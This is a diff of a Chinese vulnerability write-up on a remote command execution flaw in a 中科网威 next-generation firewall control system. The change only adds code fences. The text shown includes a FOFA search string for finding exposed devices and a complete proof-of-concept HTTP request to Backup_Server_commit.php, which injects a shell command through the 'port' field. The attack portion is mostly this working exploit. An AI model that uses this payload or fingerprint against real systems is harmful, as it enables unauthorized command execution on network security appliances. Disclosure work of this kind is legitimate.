@@ -80,6 +80,7 @@ FOFA：body="Get_Verify_Info(hex_md5(user_string)."
 
 POC/EXP：
 
+```http
 POST /view/DBManage/Backup_Server_commit.php?action=test HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
@@ -96,6 +97,7 @@ Sec-Fetch-User: ?1
 Priority: u=4
 
 host=&mode=0&port=;echo%20%60pwd%60%20|tee%20/tmp/www/reporter/cs.txt|pwd&user=&password=&ftppath=
+```
 
 ![image-20241015120750897](./.resource/中科网威下一代防火墙控制系统Backup_Server_commit存在远程命令执行漏洞/media/image-20241015120750897.png)
 
